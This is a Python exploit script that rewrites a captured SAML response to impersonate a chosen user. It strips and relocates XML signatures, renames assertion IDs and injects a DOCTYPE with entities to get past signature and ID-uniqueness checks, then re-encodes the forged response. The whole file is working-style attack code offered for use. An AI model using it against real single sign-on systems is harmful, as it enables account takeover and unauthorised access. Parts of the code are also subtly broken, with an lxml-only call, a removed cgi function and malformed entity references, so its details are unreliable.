import base64
import cgi
import xml.etree.ElementTree as ET
import sys

def remove_signature(node, signature_nodes):
    for sig in signature_nodes:
        referenced_id = sig.find(".//{*}Reference").get('URI', '').lstrip('#')
        if referenced_id == node.get('ID'):
            node.remove(sig)

def main():
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <response_file> <target_NameID>")
        sys.exit(1)

    target = sys.argv[2]
    encoded_response = open(sys.argv[1], 'r').read().strip()
    decoded_response = base64.b64decode(cgi.unescape(encoded_response)).decode('utf-8')

    xml_doc = ET.fromstring(decoded_response)
    namespace = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    ET.register_namespace('', namespace['saml'])

    response_node = xml_doc.find('.//{*}Response')
    assertion_node = xml_doc.find('.//{*}Assertion')
    signature_nodes = xml_doc.findall('.//{*}Signature')

    remove_signature(response_node, signature_nodes)

    assertion_signature = next((sig for sig in signature_nodes if sig.find(".//{*}Reference").get('URI', '').lstrip('#') == assertion_node.get('ID')), None)

    if assertion_signature and assertion_signature.getparent() != response_node:
        response_signature = ET.Element(assertion_signature.tag, assertion_signature.attrib)
        response_node.append(response_signature)
        object_node = ET.SubElement(response_signature, '{http://www.w3.org/2000/09/xmldsig#}Object')
        object_node.append(assertion_node)

    assertion_id = assertion_node.get('ID')
    assertion_node.set('ID', assertion_id + 'ffff')
    assertion_signature = assertion_node.find('.//{*}Signature')
    if assertion_signature is not None:
        assertion_node.remove(assertion_signature)

    response_node.set('ID', 'idViaEntity')

    object_assertion = response_node.find('.//{*}Signature//{*}Object//{*}Assertion')
    if object_assertion is not None:
        object_assertion.set('ID', 'BypassIDUniqness' + object_assertion.get('ID'))

    name_id_node = assertion_node.find('.//{*}NameID')
    if name_id_node is not None:
        name_id_node.text = target

    xml_str = ET.tostring(xml_doc, encoding='utf-8', method='xml').decode('utf-8')
    mutated = xml_str.replace('idViaEntity', '&#idViaEntity;').replace('BypassIDUniqness', '&#BypassIDUniqness;')
    mutated = mutated.replace('<?xml version="1.0" encoding="UTF-8"?>',
                              '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE abcd [ <!ENTITY idViaEntity "%s"> <!ENTITY BypassIDUniqness "&#x41;"> ]>' % assertion_id)

    modified_response = base64.b64encode(mutated.encode('utf-8')).decode('utf-8')
    print(cgi.escape(modified_response))

if __name__ == "__main__":
    main()